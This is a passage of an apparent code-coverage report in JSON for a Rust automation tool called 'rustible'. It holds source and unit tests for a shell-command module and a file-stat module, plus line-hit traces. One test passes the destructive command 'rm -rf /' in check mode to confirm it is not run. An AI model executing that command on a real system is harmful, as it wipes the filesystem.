{\n                return Err(ModuleError::CommandFailed {\n                    code: rc,\n                    message: if stderr.is_empty() { stdout } else { stderr },\n                });\n            }\n        }\n\n        // Execute the command\n        let output = command.output().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to execute shell command: {}\", e))\n        })?;\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n        let rc = output.status.code().unwrap_or(-1);\n\n        // Check if command succeeded\n        if output.status.success() {\n            let mut result =\n                ModuleOutput::changed(\"Shell command executed successfully\".to_string())\n                    .with_command_output(Some(stdout), Some(stderr.clone()), Some(rc));\n\n            let warn_on_stderr = params.get_bool_or(\"warn\", true);\n            if warn_on_stderr \u0026\u0026 !stderr.is_empty() {\n                result\n                    .data\n                    .insert(\"warnings\".to_string(), serde_json::json!([stderr]));\n            }\n\n            Ok(result)\n        } else {\n            Err(ModuleError::CommandFailed {\n                code: rc,\n                message: if stderr.is_empty() { stdout } else { stderr },\n            })\n        }\n    }\n\n    /// Execute shell command on remote host using async connection\n    fn execute_remote(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Use tokio runtime to execute async operations\n        let rt = tokio::runtime::Runtime::new().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to create runtime: {}\", e))\n        })?;\n\n        let params_clone = params.clone();\n        let check_mode = context.check_mode;\n        let cmd = params.get_string_required(\"cmd\")?;\n        let shell_cmd = self.build_shell_command(\u0026cmd, params)?;\n        let options = self.build_execute_options(params, context)?;\n        let warn_on_stderr = params.get_bool_or(\"warn\", true);\n\n        rt.block_on(async {\n            // Check creates/removes conditions on remote\n            if let Some(output) = self\n                .check_creates_removes_remote(\u0026params_clone, \u0026connection)\n                .await?\n            {\n                return Ok(output);\n            }\n\n            // In check mode, return what would happen\n            if check_mode {\n                return Ok(ModuleOutput::changed(format!(\n                    \"Would execute shell command: {}\",\n                    cmd\n                )));\n            }\n\n            // Execute via connection\n            // Note: The connection.execute() runs through a shell anyway,\n            // but we wrap with explicit shell call for consistency and to\n            // support custom shell executables\n            let result = connection\n                .execute(\u0026shell_cmd, Some(options))\n                .await\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\n                        \"Failed to execute shell command '{}': {}\",\n                        cmd, e\n                    ))\n                })?;\n\n            if result.success {\n                let mut output =\n                    ModuleOutput::changed(\"Shell command executed successfully\".to_string())\n                        .with_command_output(\n                            Some(result.stdout.clone()),\n                            Some(result.stderr.clone()),\n                            Some(result.exit_code),\n                        );\n\n                if warn_on_stderr \u0026\u0026 !result.stderr.is_empty() {\n                    output\n                        .data\n                        .insert(\"warnings\".to_string(), serde_json::json!([result.stderr]));\n                }\n\n                Ok(output)\n            } else {\n                Err(ModuleError::CommandFailed {\n                    code: result.exit_code,\n                    message: if result.stderr.is_empty() {\n                        result.stdout\n                    } else {\n                        result.stderr\n                    },\n                })\n            }\n        })\n    }\n}\n\nimpl Module for ShellModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"shell\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Execute shell commands with full shell features\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"cmd\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Dispatch to local or remote execution based on connection\n        if let Some(ref connection) = context.connection {\n            self.execute_remote(params, context, connection.clone())\n        } else {\n            self.execute_local(params, context)\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // For check mode, we run execute with check_mode=true in context\n        // The execute methods already handle check_mode internally\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let cmd = params.get_string_required(\"cmd\")?;\n        Ok(Some(Diff::new(\"(none)\", format!(\"Execute: {}\", cmd))))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n\n    #[test]\n    fn test_shell_echo() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"echo hello\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.stdout.as_ref().unwrap().contains(\"hello\"));\n    }\n\n    #[test]\n    fn test_shell_pipe() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"cmd\".to_string(),\n            serde_json::json!(\"echo 'hello world' | grep hello\"),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.stdout.as_ref().unwrap().contains(\"hello\"));\n    }\n\n    #[test]\n    fn test_shell_env_expansion() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"echo $HOME\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        // HOME should be expanded to a path\n        assert!(!result.stdout.as_ref().unwrap().contains(\"$HOME\"));\n    }\n\n    #[test]\n    fn test_shell_check_mode() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"rm -rf /\"));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would execute\"));\n    }\n\n    #[test]\n    fn test_shell_creates_exists() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"echo hello\"));\n        params.insert(\"creates\".to_string(), serde_json::json!(\"/\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"Skipped\"));\n    }\n\n    #[test]\n    fn test_shell_with_stdin() {\n        let module = ShellModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"cat\"));\n        params.insert(\"stdin\".to_string(), serde_json::json!(\"hello from stdin\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.stdout.as_ref().unwrap().contains(\"hello from stdin\"));\n    }\n}\n","traces":[{"line":23,"address":[28548161,28548167,28547296],"length":1,"stats":{"Line":1}},{"line":25,"address":[28547494,28547367],"length":1,"stats":{"Line":1}},{"line":27,"address":[31111056,31111068],"length":1,"stats":{"Line":3}},{"line":30,"address":[28547654,28547586],"length":1,"stats":{"Line":2}},{"line":31,"address":[28547713,28548143],"length":1,"stats":{"Line":0}},{"line":32,"address":[28547860,28547696,28547757],"length":1,"stats":{"Line":3}},{"line":33,"address":[28548138,28547816],"length":1,"stats":{"Line":0}},{"line":35,"address":[28547897],"length":1,"stats":{"Line":1}},{"line":38,"address":[28547935],"length":1,"stats":{"Line":1}},{"line":42,"address":[28543449,28543455,28542336],"length":1,"stats":{"Line":0}},{"line":43,"address":[28542433,28542560],"length":1,"stats":{"Line":0}},{"line":45,"address":[28542617],"length":1,"stats":{"Line":0}},{"line":48,"address":[28542806,28542720,28542652],"length":1,"stats":{"Line":0}},{"line":49,"address":[28542779],"length":1,"stats":{"Line":0}},{"line":50,"address":[28542821,28542762,28542983,28542907],"length":1,"stats":{"Line":0}},{"line":51,"address":[28542880],"length":1,"stats":{"Line":0}},{"line":53,"address":[28542956],"length":1,"stats":{"Line":0}},{"line":57,"address":[28543025],"length":1,"stats":{"Line":0}},{"line":58,"address":[28543067,28543178],"length":1,"stats":{"Line":0}},{"line":62,"address":[28544357,28545817,28543472],"length":1,"stats":{"Line":0}},{"line":67,"address":[28543523],"length":1,"stats":{"Line":0}},{"line":70,"address":[28543678,28543594,28545691],"length":1,"stats":{"Line":0}},{"line":71,"address":[28543901,28544024],"length":1,"stats":{"Line":0}},{"line":72,"address":[28543990,28544112,28544334],"length":1,"stats":{"Line":0}},{"line":73,"address":[28544347,28544203,28544120],"length":1,"stats":{"Line":0}},{"line":77,"address":[28544459,28544368,28544076],"length":1,"stats":{"Line":0}},{"line":78,"address":[28544487],"length":1,"stats":{"Line":0}},{"line":79,"address":[28544648,28544816],"length":1,"stats":{"Line":0}},{"line":80,"address":[28544683],"length":1,"stats":{"Line":0}},{"line":86,"address":[28544837,28545653,28544429],"length":1,"stats":{"Line":0}},{"line":87,"address":[28545167,28545010],"length":1,"stats":{"Line":0}},{"line":88,"address":[28545039],"length":1,"stats":{"Line":0}},{"line":93,"address":[28545021,28545635],"length":1,"stats":{"Line":0}},{"line":94,"address":[28545276],"length":1,"stats":{"Line":0}},{"line":95,"address":[28545284,28545326],"length":1,"stats":{"Line":0}},{"line":96,"address":[28545496,28545454],"length":1,"stats":{"Line":0}},{"line":99,"address":[28545172],"length":1,"stats":{"Line":0}},{"line":103,"address":[28545856,28546620,28546626],"length":1,"stats":{"Line":1}},{"line":108,"address":[28545902],"length":1,"stats":{"Line":1}},{"line":109,"address":[28546163,28546346],"length":1,"stats":{"Line":2}},{"line":110,"address":[28546394],"length":1,"stats":{"Line":1}},{"line":118,"address":[28546200,28546644],"length":1,"stats":{"Line":1}},{"line":119,"address":[28546976,28546847],"length":1,"stats":{"Line":0}},{"line":120,"address":[28547051,28547005],"length":1,"stats":{"Line":0}},{"line":127,"address":[28546881],"length":1,"stats":{"Line":1}},{"line":131,"address":[28547248],"length":1,"stats":{"Line":0}},{"line":137,"address":[31109315,31108552,31108702],"length":1,"stats":{"Line":0}},{"line":138,"address":[31109557,31108973,31109193,31109280,31109631],"length":1,"stats":{"Line":0}},{"line":139,"address":[31109130,31109197],"length":1,"stats":{"Line":0}},{"line":140,"address":[26005953],"length":1,"stats":{"Line":0}},{"line":142,"address":[31109643],"length":1,"stats":{"Line":0}},{"line":143,"address":[31109681,31110306],"length":1,"stats":{"Line":0}},{"line":151,"address":[31109008,31110301,31109723],"length":1,"stats":{"Line":0}},{"line":152,"address":[31110756,31109994,31110266,31110203,31110688],"length":1,"stats":{"Line":0}},{"line":153,"address":[31110152,31110207],"length":1,"stats":{"Line":0}},{"line":154,"address":[26005969],"length":1,"stats":{"Line":0}},{"line":156,"address":[31110768],"length":1,"stats":{"Line":0}},{"line":157,"address":[31110780,31110837],"length":1,"stats":{"Line":0}},{"line":164,"address":[31110021],"length":1,"stats":{"Line":0}},{"line":168,"address":[28540482,28534699,28532992],"length":1,"stats":{"Line":1}},{"line":174,"address":[28533078],"length":1,"stats":{"Line":1}},{"line":175,"address":[28533407],"length":1,"stats":{"Line":1}},{"line":178,"address":[28533435,28533544],"length":1,"stats":{"Line":1}},{"line":181,"address":[28533734],"length":1,"stats":{"Line":1}},{"line":182,"address":[28540328,28533782],"length":1,"stats":{"Line":2}},{"line":188,"address":[28540326,28533872,28533767],"length":1,"stats":{"Line":2}},{"line":190,"address":[28534109],"length":1,"stats":{"Line":1}},{"line":191,"address":[28534176,28534248],"length":1,"stats":{"Line":2}},{"line":194,"address":[28540264,28534263],"length":1,"stats":{"Line":1}},{"line":195,"address":[28534548],"length":1,"stats":{"Line":0}},{"line":196,"address":[28534713,28534563],"length":1,"stats":{"Line":1}},{"line":197,"address":[28534729],"length":1,"stats":{"Line":0}},{"line":201,"address":[28534668,28534746,28534840],"length":1,"stats":{"Line":2}},{"line":202,"address":[28534868],"length":1,"stats":{"Line":0}},{"line":203,"address":[28535047],"length":1,"stats":{"Line":0}},{"line":204,"address":[28535096],"length":1,"stats":{"Line":0}},{"line":210,"address":[28540259,28534810,28535124],"length":1,"stats":{"Line":2}},{"line":214,"address":[28535467,28535350],"length":1,"stats":{"Line":2}},{"line":215,"address":[28535474],"length":1,"stats":{"Line":1}},{"line":216,"address":[28535528],"length":1,"stats":{"Line":1}},{"line":218,"address":[28537840,28535582,28535710],"length":1,"stats":{"Line":1}},{"line":219,"address":[31102971,31103039],"length":1,"stats":{"Line":0}},{"line":222,"address":[28535867],"length":1,"stats":{"Line":1}},{"line":223,"address":[28536084,28535926,28536226],"length":1,"stats":{"Line":2}},{"line":224,"address":[31103787,31103855],"length":1,"stats":{"Line":0}},{"line":228,"address":[31103465,31103471,31103216],"length":1,"stats":{"Line":2}},{"line":229,"address":[31103311,31103243],"length":1,"stats":{"Line":0}},{"line":232,"address":[28536545,28536624],"length":1,"stats":{"Line":2}},{"line":233,"address":[28536779],"length":1,"stats":{"Line":1}},{"line":234,"address":[28536976],"length":1,"stats":{"Line":1}},{"line":236,"address":[28537038],"length":1,"stats":{"Line":1}},{"line":237,"address":[28537616,28537407],"length":1,"stats":{"Line":2}},{"line":238,"address":[28537086],"length":1,"stats":{"Line":1}},{"line":240,"address":[28537419],"length":1,"stats":{"Line":1}},{"line":242,"address":[28537256],"length":1,"stats":{"Line":0}},{"line":244,"address":[28537124,28537075],"length":1,"stats":{"Line":0}},{"line":250,"address":[31103737,31103488,31103743],"length":1,"stats":{"Line":2}},{"line":251,"address":[31103583,31103515],"length":1,"stats":{"Line":0}},{"line":254,"address":[28538140,28538219],"length":1,"stats":{"Line":2}},{"line":255,"address":[28538374],"length":1,"stats":{"Line":1}},{"line":256,"address":[28538574],"length":1,"stats":{"Line":1}},{"line":259,"address":[28538636,28539430],"length":1,"stats":{"Line":2}},{"line":260,"address":[28539005,28539205,28538684],"length":1,"stats":{"Line":3}},{"line":262,"address":[28539127,28539259,28539020,28540180],"length":1,"stats":{"Line":2}},{"line":264,"address":[28539290,28539362],"length":1,"stats":{"Line":2}},{"line":265,"address":[28539443,28539374],"length":1,"stats":{"Line":2}},{"line":266,"address":[28539879,28539464],"length":1,"stats":{"Line":0}},{"line":268,"address":[28539887,28539477,28539538],"length":1,"stats":{"Line":0}},{"line":271,"address":[28539378],"length":1,"stats":{"Line":1}},{"line":273,"address":[28538854],"length":1,"stats":{"Line":0}},{"line":275,"address":[28538722,28538673],"length":1,"stats":{"Line":0}},{"line":281,"address":[28540496,28542206,28542314],"length":1,"stats":{"Line":0}},{"line":288,"address":[28540642,28540737,28540562,28542312],"length":1,"stats":{"Line":0}},{"line":289,"address":[31104059,31104127],"length":1,"stats":{"Line":0}},{"line":292,"address":[28540932],"length":1,"stats":{"Line":0}},{"line":293,"address":[28540990],"length":1,"stats":{"Line":0}},{"line":294,"address":[28541003,28541087,28542279],"length":1,"stats":{"Line":0}},{"line":295,"address":[28541354,28541265,28542258],"length":1,"stats":{"Line":0}},{"line":296,"address":[28541570,28541637],"length":1,"stats":{"Line":0}},{"line":297,"address":[28541895,28541817],"length":1,"stats":{"Line":0}},{"line":299,"address":[28541905],"length":1,"stats":{"Line":0}},{"line":301,"address":[31104946,31104906,31104400,31105784,31104630,31105022],"length":1,"stats":{"Line":0}},{"line":302,"address":[31104461],"length":1,"stats":{"Line":0}},{"line":303,"address":[25962504],"length":1,"stats":{"Line":0}},{"line":305,"address":[31105144],"length":1,"stats":{"Line":0}},{"line":309,"address":[31105180],"length":1,"stats":{"Line":0}},{"line":310,"address":[31105266,31105630],"length":1,"stats":{"Line":0}},{"line":320,"address":[31105523,31105586,31105228,31106099,31106175,31105967],"length":1,"stats":{"Line":0}},{"line":321,"address":[31105527,31105380],"length":1,"stats":{"Line":0}},{"line":322,"address":[31105803,31105608,31104538,31106031,31105551],"length":1,"stats":{"Line":0}},{"line":323,"address":[31106053,31108064,31108355],"length":1,"stats":{"Line":0}},{"line":324,"address":[31108094,31108179],"length":1,"stats":{"Line":0}},{"line":330,"address":[31106276,31107110],"length":1,"stats":{"Line":0}},{"line":332,"address":[31106725,31106316,31106961],"length":1,"stats":{"Line":0}},{"line":333,"address":[31107015],"length":1,"stats":{"Line":0}},{"line":334,"address":[31106740,31106813],"length":1,"stats":{"Line":0}},{"line":335,"address":[31106853,31106921],"length":1,"stats":{"Line":0}},{"line":336,"address":[31106953],"length":1,"stats":{"Line":0}},{"line":339,"address":[31107178,31107115,31107046],"length":1,"stats":{"Line":0}},{"line":340,"address":[31107184,31107624],"length":1,"stats":{"Line":0}},{"line":342,"address":[31107632,31107228,31107290,31107197],"length":1,"stats":{"Line":0}},{"line":345,"address":[31107058],"length":1,"stats":{"Line":0}},{"line":347,"address":[31106518],"length":1,"stats":{"Line":0}},{"line":348,"address":[31106286],"length":1,"stats":{"Line":0}},{"line":349,"address":[31106297,31106394,31106456],"length":1,"stats":{"Line":0}},{"line":350,"address":[31106458],"length":1,"stats":{"Line":0}},{"line":352,"address":[31106400],"length":1,"stats":{"Line":0}},{"line":361,"address":[28532368],"length":1,"stats":{"Line":0}},{"line":365,"address":[28531728],"length":1,"stats":{"Line":0}},{"line":369,"address":[28531760],"length":1,"stats":{"Line":0}},{"line":373,"address":[28531776],"length":1,"stats":{"Line":0}},{"line":377,"address":[28532832],"length":1,"stats":{"Line":1}},{"line":383,"address":[28532875],"length":1,"stats":{"Line":1}},{"line":384,"address":[28532921],"length":1,"stats":{"Line":0}},{"line":386,"address":[28532977],"length":1,"stats":{"Line":1}},{"line":390,"address":[28532806,28532800,28532400],"length":1,"stats":{"Line":1}},{"line":397,"address":[28532736],"length":1,"stats":{"Line":1}},{"line":400,"address":[28531808,28532348,28532354],"length":1,"stats":{"Line":0}},{"line":401,"address":[28531862],"length":1,"stats":{"Line":0}},{"line":402,"address":[28532140,28532072],"length":1,"stats":{"Line":0}}],"covered":55,"coverable":160},{"path":["/","home","artur","Repositories","rustible","src","modules","stat.rs"],"content":"//! Stat module - Retrieve file information\n//!\n//! This module retrieves file or directory information from a target system.\n//! It returns detailed file statistics including size, permissions, ownership,\n//! timestamps, and file type information.\n//!\n//! The returned information can be registered and used in subsequent tasks for\n//! conditional execution or decision-making.\n\nuse super::{\n    Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse serde_json::json;\nuse std::path::Path;\n\n/// Module for retrieving file statistics\npub struct StatModule;\n\nimpl Module for StatModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"stat\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Retrieve file or directory information\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"path\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let follow = params.get_bool_or(\"follow\", true);\n        let get_checksum = params.get_bool_or(\"checksum\", false);\n        let checksum_algorithm = params\n            .get_string(\"checksum_algorithm\")?\n            .unwrap_or_else(|| \"sha1\".to_string());\n\n        // Execute locally (remote execution would require connection in ModuleContext)\n        self.execute_local(path, follow, get_checksum, \u0026checksum_algorithm)\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Stat is read-only, so check mode behaves the same as normal mode\n        self.execute(params, context)\n    }\n}\n\nimpl StatModule {\n    /// Execute stat on local system\n    fn execute_local(\n        \u0026self,\n        path: \u0026Path,\n        follow: bool,\n        get_checksum: bool,\n        checksum_algorithm: \u0026str,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Check if path exists\n        let exists = if follow {\n            path.exists()\n        } else {\n            path.symlink_metadata().is_ok()\n        };\n\n        if !exists {\n            return Ok(\n                ModuleOutput::ok(format!(\"Path '{}' does not exist\", path.display())).with_data(\n                    \"stat\",\n                    json!({\n                        \"exists\": false,\n                        \"path\": path.display().to_string(),\n                    }),\n                ),\n            );\n        }\n\n        // Get metadata\n        let metadata = if follow {\n            std::fs::metadata(path)\n        } else {\n            std::fs::symlink_metadata(path)\n        }\n        .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to get metadata: {}\", e)))?;\n\n        // Extract file stats\n        #[cfg(unix)]\n        use std::os::unix::fs::MetadataExt;\n\n        #[cfg(unix)]\n        let (mode, uid, gid, atime, mtime) = {\n            (\n                metadata.mode(),\n                metadata.uid(),\n                metadata.gid(),\n                metadata.atime(),\n                metadata.mtime(),\n            )\n        };\n\n        #[cfg(not(unix))]\n        let (mode, uid, gid, atime, mtime) = { (0o644u32, 0u32, 0u32, 0i64, 0i64) };\n\n        let is_dir = metadata.is_dir();\n        let is_file = metadata.is_file();\n        let is_symlink = metadata.file_type().is_symlink();\n\n        // Build stat data\n        let mut stat_data = json!({\n            \"exists\": true,\n            \"path\": path.display().to_string(),\n            \"mode\": format!(\"{:04o}\", mode),\n            \"isdir\": is_dir,\n            \"isreg\": is_file,\n            \"islnk\": is_symlink,\n            \"size\": metadata.len(),\n            \"uid\": uid,\n            \"gid\": gid,\n            \"atime\": atime,\n            \"mtime\": mtime,\n            \"readable\": true,\n            \"writeable\": (mode \u0026 0o200) != 0,\n            \"executable\": (mode \u0026 0o111) != 0,\n        });\n\n        // Get checksum if requested and it's a regular file\n        if get_checksum \u0026\u0026 is_file {\n            let checksum = self.calculate_checksum_local(path, checksum_algorithm)?;\n            if let Some(stat_obj) = stat_data.as_object_mut() {\n                stat_obj.insert(\"checksum\".to_string(), json!(checksum));\n            }\n        }\n\n        // Get symlink target if it's a symlink and follow is true\n        if is_symlink \u0026\u0026 follow {\n            if let Ok(target) = std::fs::read_link(path) {\n                if let Some(stat_obj) = stat_data.as_object_mut() {\n                    stat_obj.insert(\n                        \"lnk_source\".to_string(),\n                        json!(target.display().to_string()),\n                    );\n                }\n            }\n        }\n\n        Ok(\n            ModuleOutput::ok(format!(\"Retrieved stats for '{}'\", path.display()))\n                .with_data(\"stat\", stat_data),\n        )\n    }\n\n    /// Calculate checksum for a local file\n    fn calculate_checksum_local(\u0026self, path: \u0026Path, algorithm: \u0026str) -\u003e ModuleResult\u003cString\u003e {\n        use std::io::Read;\n\n        let mut file = std::fs::File::open(path)\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to open file: {}\", e)))?;\n\n        let mut buffer = Vec::new();\n        file.read_to_end(\u0026mut buffer)\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to read file: {}\", e)))?;\n\n        match algorithm.to_lowercase().as_str() {\n            \"md5\" =\u003e {\n                let digest = md5::compute(\u0026buffer);\n                Ok(format!(\"{:x}\", digest))\n            }\n            \"sha1\" =\u003e {\n                use sha1::Digest;\n                let mut hasher = sha1::Sha1::new();\n                hasher.update(\u0026buffer);\n                let result = hasher.finalize();\n                Ok(format!(\"{:x}\", result))\n            }\n            \"sha256\" =\u003e {\n                use sha2::{Digest, Sha256};\n                let mut hasher = Sha256::new();\n                hasher.update(\u0026buffer);\n                let result = hasher.finalize();\n                Ok(format!(\"{:x}\", result))\n            }\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Unsupported checksum algorithm: {}\",\n                algorithm\n            ))),\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_stat_existing_file() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n        std::fs::write(\u0026path, \"test content\").unwrap();\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert!(result.data.contains_key(\"stat\"));\n\n        let stat = \u0026result.data[\"stat\"];\n        assert_eq!(stat[\"exists\"], true);\n        assert_eq!(stat[\"isreg\"], true);\n        assert_eq!(stat[\"isdir\"], false);\n        assert_eq!(stat[\"size\"], 12);\n    }\n\n    #[test]\n    fn test_stat_nonexistent_file() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"nonexistent\");\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        assert!(result.data.contains_key(\"stat\"));\n\n        let stat = \u0026result.data[\"stat\"];\n        assert_eq!(stat[\"exists\"], false);\n    }\n\n    #[test]\n    fn test_stat_directory() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testdir\");\n        std::fs::create_dir(\u0026path).unwrap();\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n\n        let stat = \u0026result.data[\"stat\"];\n        assert_eq!(stat[\"exists\"], true);\n        assert_eq!(stat[\"isdir\"], true);\n        assert_eq!(stat[\"isreg\"], false);\n    }\n\n    #[test]\n    fn test_stat_symlink() {\n        let temp = TempDir::new().unwrap();\n        let target = temp.path().join(\"target\");\n        let link = temp.path().join(\"link\");\n\n        std::fs::write(\u0026target, \"content\").unwrap();\n\n        #[cfg(unix)]\n        {\n            use std::os::unix::fs::symlink;\n            symlink(\u0026target, \u0026link).unwrap();\n        }\n\n        #[cfg(not(unix))]\n        {\n            // Skip test on non-Unix systems\n            return;\n        }\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(link.to_str().unwrap()),\n        );\n        params.insert(\"follow\".to_string(), serde_json::json!(false));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        let stat = \u0026result.data[\"stat\"];\n        assert_eq!(stat[\"exists\"], true);\n        assert_eq!(stat[\"islnk\"], true);\n    }\n\n    #[test]\n    fn test_stat_with_checksum() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n        std::fs::write(\u0026path, \"test content\").unwrap();\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"checksum\".to_string(), serde_json::json!(true));\n        params.insert(\"checksum_algorithm\".to_string(), serde_json::json!(\"sha1\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        let stat = \u0026result.data[\"stat\"];\n        assert!(stat.get(\"checksum\").is_some());\n    }\n\n    #[test]\n    fn test_stat_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n        std::fs::write(\u0026path, \"test content\").unwrap();\n\n        let module = StatModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        // Stat is read-only, so it should work the same in check mode\n        assert_eq!(result.status, super::super::ModuleStatus::Ok);\n        let stat = \u0026result.data[\"stat\"];\n        assert_eq!(stat[\"exists\"], true);\n    }\n}\n","traces":[{"line":21,"address":[29940256],"length":1,"stats":{"Line":0}},{"line":25,"address":[29940176],"length":1,"stats":{"Line":0}},{"line":29,"address":[29940208],"length":1,"stats":{"Line":0}},{"line":33,"address":[29940224],"length":1,"stats":{"Line":0}},{"line":37,"address":[29941231,29940336,29941250],"length":1,"stats":{"Line":1}},{"line":42,"address":[29940395],"length":1,"stats":{"Line":1}},{"line":43,"address":[29940633,29940715],"length":1,"stats":{"Line":2}},{"line":44,"address":[29940747],"length":1,"stats":{"Line":1}},{"line":45,"address":[29940793],"length":1,"stats":{"Line":1}},{"line":46,"address":[29940879,29940960],"length":1,"stats":{"Line":1}},{"line":48,"address":[29941017],"length":1,"stats":{"Line":3}},{"line":51,"address":[29941155,29941055],"length":1,"stats":{"Line":2}},{"line":54,"address":[29940288],"length":1,"stats":{"Line":1}},{"line":56,"address":[29940315],"length":1,"stats":{"Line":1}},{"line":62,"address":[29941800,29941806,29941264],"length":1,"stats":{"Line":1}},{"line":70,"address":[29941478],"length":1,"stats":{"Line":1}},{"line":71,"address":[29941697],"length":1,"stats":{"Line":1}},{"line":73,"address":[29941650,29941761],"length":1,"stats":{"Line":2}},{"line":76,"address":[29941784],"length":1,"stats":{"Line":1}},{"line":77,"address":[29942827],"length":1,"stats":{"Line":1}},{"line":78,"address":[29942760,29941835],"length":1,"stats":{"Line":2}},{"line":80,"address":[29942476,29942861,29942350,29942112,29942044,29942449],"length":1,"stats":{"Line":3}},{"line":82,"address":[29942327,29942410],"length":1,"stats":{"Line":2}},{"line":89,"